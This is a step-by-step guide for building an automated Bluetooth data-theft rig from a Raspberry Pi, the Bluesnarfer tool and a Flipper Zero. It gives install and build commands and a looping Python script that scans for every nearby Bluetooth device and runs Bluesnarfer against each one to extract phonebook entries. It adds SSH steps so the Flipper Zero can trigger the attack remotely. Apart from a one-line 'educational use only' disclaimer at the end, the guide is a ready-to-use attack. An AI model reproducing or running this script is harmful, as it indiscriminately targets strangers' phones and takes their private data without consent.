1. Install Bluesnarfer on Raspberry Pi   REFERENCE: https://github.com/webdragon63/Bluesnarfer

1.1 System Update:

First, make sure your Raspberry Pi’s operating system is up to date:



sudo apt update && sudo apt upgrade -y

1.2 Install BlueZ (Bluetooth stack for Linux):


sudo apt install bluez bluez-tools

1.3 Clone and Build Bluesnarfer:

Now, download and compile Bluesnarfer from the GitHub repository.


git clone https://github.com/kimbo/bluesnarfer.git
cd bluesnarfer

Compile the program:

make

Verify the installation:


    ./bluesnarfer --help

You should see the help options for Bluesnarfer, confirming that it’s installed correctly.
2. Configure Bluetooth on Raspberry Pi
2.1 Enable Bluetooth:

Ensure that Bluetooth is enabled on the Raspberry Pi:


sudo systemctl enable bluetooth
sudo systemctl start bluetooth

2.2 Check Bluetooth Adapter:

Run the following to check if your Bluetooth adapter is recognized:



hciconfig

2.3 Scan for Devices:

Use hcitool to scan for nearby Bluetooth devices:


sudo hcitool scan

This will give you a list of nearby Bluetooth devices, showing their names and MAC addresses. You’ll need the MAC address to run Bluesnarfer.
3. Automate the Scanning and Attacks

Here’s a Python script that automates Bluetooth scanning and uses Bluesnarfer to attempt to extract data from vulnerable devices.
Python Automation Script:

python

import bluetooth
import subprocess
import time

# Function to scan for Bluetooth devices
def scan_devices():
    print("Scanning for devices...")
    devices = bluetooth.discover_devices(duration=8, lookup_names=True)
    if len(devices) > 0:
        print(f"Found {len(devices)} devices!")
        return devices
    else:
        print("No devices found.")
        return []

# Function to execute Bluesnarfer
def bluesnarf(mac_address):
    print(f"Attempting blue snarfing on {mac_address}...")
    try:
        # Using Bluesnarfer to get phonebook
        subprocess.run(["./bluesnarfer", "-b", mac_address, "-r", "1-10"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running Bluesnarfer: {e}")

# Main logic
if __name__ == "__main__":
    while True:
        devices = scan_devices()
        for addr, name in devices:
            print(f"Device {name} found with MAC address {addr}")
            # Attempt to run bluesnarfer on each device found
            bluesnarf(addr)
        time.sleep(10)  # Wait before scanning again

How the Script Works:

    Scan Devices: It continuously scans for Bluetooth devices using the bluetooth.discover_devices() method.
    Run Bluesnarfer: When a device is found, it runs the Bluesnarfer command with the device’s MAC address to try and extract data.
    Repeat: It loops every 10 seconds, scanning again and repeating the attack on any new devices found.

4. Flipper Zero as a Remote Controller
Option 1: Flipper Zero as Bluetooth Scanner

    Scan Bluetooth Devices: Use the Flipper Zero’s built-in Bluetooth module to discover devices in your vicinity and send the MAC addresses to the Raspberry Pi over Wi-Fi or Bluetooth for Bluesnarfer to target.

Option 2: Flipper Zero as Remote Controller

    Connect to the Raspberry Pi via SSH:
        Set up Wi-Fi on both the Flipper Zero and the Raspberry Pi.
        SSH into the Raspberry Pi from the Flipper Zero:

     

        ssh pi@<Raspberry_Pi_IP>

    Trigger the Python script from Flipper Zero: Once connected via SSH, you can control the Raspberry Pi remotely, starting the Python script or manually running Bluesnarfer.

5. Running the Project

    Run the Python Script on the Raspberry Pi:
        Start the Python script to scan for Bluetooth devices and attempt blue snarfing on vulnerable targets.

   

    python3 bluesnarf_auto.py

    Use the Flipper Zero as a Controller:
        Use Flipper Zero to scan for devices, collect MAC addresses, and send them to the Raspberry Pi, or remotely control the Raspberry Pi by issuing SSH commands.

Final Considerations

    Educational Use Only: Remember that Bluesnarfer exploits vulnerabilities in Bluetooth devices and should only be used in controlled environments with explicit permission.
    Automation Benefits: The Python script automates the scanning and exploitation process, making the Raspberry Pi efficient at detecting and snarfing data from nearby devices.
    Flipper Zero Integration: Flipper Zero enhances the setup by allowing remote control and flexibility, making the overall project more interactive.

This complete setup demonstrates how to use Raspberry Pi and Flipper Zero to automate Bluetooth attacks for educational purposes, showing both scanning and data extraction using Bluesnarfer.
